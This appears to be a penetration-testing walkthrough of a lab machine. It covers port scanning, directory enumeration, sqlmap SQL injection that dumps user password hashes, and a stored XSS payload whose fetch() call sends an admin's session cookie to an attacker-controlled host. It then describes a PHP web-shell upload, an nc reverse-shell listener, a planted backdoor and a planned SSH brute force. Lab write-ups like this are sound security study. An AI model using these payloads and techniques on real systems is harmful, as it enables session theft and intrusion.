# Box1 Pentesting

## Scan

### Nmap

First and second scan gives us practicaly nothing, there are only a web server and ssh

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-12 08:32 CET
Nmap scan report for box1 (192.168.56.20)
Host is up (0.00095s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   256 d5:1b:f7:39:5b:ef:ae:13:b1:49:f1:48:18:d8:b2:e7 (ECDSA)
|_  256 b3:4e:06:ac:84:61:24:e0:2e:7a:4f:6a:9f:a0:9e:09 (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: Support Center
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
MAC Address: 08:00:27:3E:22:07 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.43 seconds
```

## Web

### Gobuster

We find many paths while iterating with gobuster

```bash
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 269]
/index.php            (Status: 200) [Size: 2716]
/assets               (Status: 301) [Size: 297] [--> http://box1/assets/]
/includes             (Status: 301) [Size: 299] [--> http://box1/includes/]
/login.php            (Status: 200) [Size: 0]
/uploads              (Status: 301) [Size: 298] [--> http://box1/uploads/]
/ticket.php           (Status: 302) [Size: 2170] [--> index.php]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
````

#### index.php

On the main page we have a search bar and a login bar
Seaching `AI` will get results

We'll try an SQL Injection on this search bar.

**SQL Injection**

sqli.req
```http
POST /index.php HTTP/1.1
Host: 192.168.56.20
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 23
Origin: http://192.168.56.20
Connection: close
Referer: http://192.168.56.20/index.php
Cookie: PHPSESSID=pt1imptogicoplt8tmmk9o9lkj
Upgrade-Insecure-Requests: 1

search=*&submit=Search
```

Using sqlmap with the previous request gives us something, it seems that we have an injectable parameter.
```
sqlmap identified the following injection point(s) with a total of 76 HTTP(s) requests [...]
```

Let's get the tables
```bash
sqlmap -r sqli.req --tables
```
```bash
Database: support
[2 tables]
+---------------------------------------+
| articles                              |
| users                                 |
+---------------------------------------+
```

The users table seems promising, after dumping it we obtains two results :

`john:ba54f1d5fc61016e49a222d0ab6fd671`
`administrator:4fd1f1d82763c1f4c27327e8f36d6294`


Using crackstation we got john's password
`john:notthisagain`

#### assets

A second iteration on assets gives us an interesting `/js`, we find a login.js file in it.

login.js
```js
function login()
{
	var request = new XMLHttpRequest();
	request.open('POST', '/login.php', true);
	request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
	var data = 'username=' + document.getElementById("username").value +'&password=' + document.getElementById("password").value + '&submit=';
	request.onreadystatechange = function()
	{
		if (this.readyState == 4)
		{
		    var text = document.createTextNode(this.responseText);
		    var element = document.getElementById("message");
		    if(!this.responseText.localeCompare("Invalid credentials."))
		    {
		    	element.textContent = text.data;
		    }
		    else
		    {
		    	window.location.replace("/");
		    }
		}
	}
	request.send(data);
}
```
It seems that its the client side logic used for the `login.php` page.

#### includes

Listing the files in this directory allows us to find that thoses files exists, but we can't read them.

```bash
/header.php           (Status: 200) [Size: 2170]
/user.php             (Status: 200) [Size: 0]
/config.php           (Status: 200) [Size: 0]
```

#### uploads

Listing the files shows us nothing.

#### tickets.php

Seems that this redirects us on the main page.




## Web, with john's login

#### tickets.php

We can now create a ticket with Text and attach to it a file. We could try an XSS to steal an admin session token, or attach a shell.php file to get a reverse shell and hope that it will be available in the /uploads previously found.


**File upload**
We used a payload in `/usr/share/webshells/php`, it doesn't appear in uploads. Lets try to upload an image or a legit thing to see if there is a filter.

After uploading a beautiful image of a picnic table, we unfortunatly can't get it via /uploads \(we can guess that the name or path of the file might have been changed automatically\).

**XSS**
Lets try to steal an admin session cookie. We can confirm that an XSS is possible by creating a simple ticket with
```html
<script>alert("Hi :D")</script>
```

Using this simple payload
```html
<script>
fetch('http://192.168.56.3/?cookies='+document.cookie)
</script>
```

We manage to get
```php
PHPSESSID=p4hvegsrht8lnhguaph727s9cae45q6kk
```

We are now logged in as an administrator !

## Web, with administrator's login

We have a new interesting page `check_tickets.php`. Seems like we can now check the file path. Lets upload our beautiful image back.

![](web/picnic.jpg)

As expected we have a randomly generated path for our file
`http://192.168.56.20/uploads/912665901c2538550ef552e92ce3ea.jpg`

Lets try now to upload our shell.php !

```bash
nc -lnvp 80
```

And we are in !

## Privilege Escalation

After stabilizing the shell, we notice that we are connected as www-data.

We find a flag in `/var/www/`

flag.txt
```txt
b51e437d19edcd33fd3b04bf46190c84
```

I placed a `shell.php` in `/var/www/html` as a little backdoor in case our shell crashes.

LinEnum.sh and linpeas.sh give nothing.


**SSH Bruteforce**
We'll try in parallel an ssh bruteforce with rockyou.txt and operator as user.

### Exploration

There is one user named operator with root privilege on this machine.

We found a `flag.txt` in his `home` dir, but its not readable.

#### /opt/monitoring

On a un script avec potentiellement des variables overridable.